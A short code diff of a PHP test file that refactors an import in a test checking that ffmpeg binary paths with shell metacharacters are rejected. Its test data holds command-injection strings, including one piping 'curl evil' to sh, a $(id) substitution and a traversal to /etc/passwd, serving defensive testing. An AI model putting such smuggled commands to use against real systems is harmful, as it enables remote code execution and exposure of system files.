@@ -5,6 +5,7 @@ use App\Models\Image;
 use App\Models\Setting;
 use App\Models\User;
 use App\Services\CCBillService;
+use App\Services\FfmpegService;
 use Illuminate\Http\Request;
 
 /*
@@ -81,7 +82,7 @@ test('registration and password reset endpoints are rate limited', function (str
 ]);
 
 test('ffmpeg binary paths with shell metacharacters are rejected', function () {
-    $method = new ReflectionMethod(App\Services\FfmpegService::class, 'isSafeBinaryPath');
+    $method = new ReflectionMethod(FfmpegService::class, 'isSafeBinaryPath');
     $method->setAccessible(true);
 
     foreach (['/usr/bin/ffmpeg; curl evil|sh', '/usr/bin/ffmpeg $(id)', 'ffmpeg', '/a/../../etc/passwd'] as $bad) {
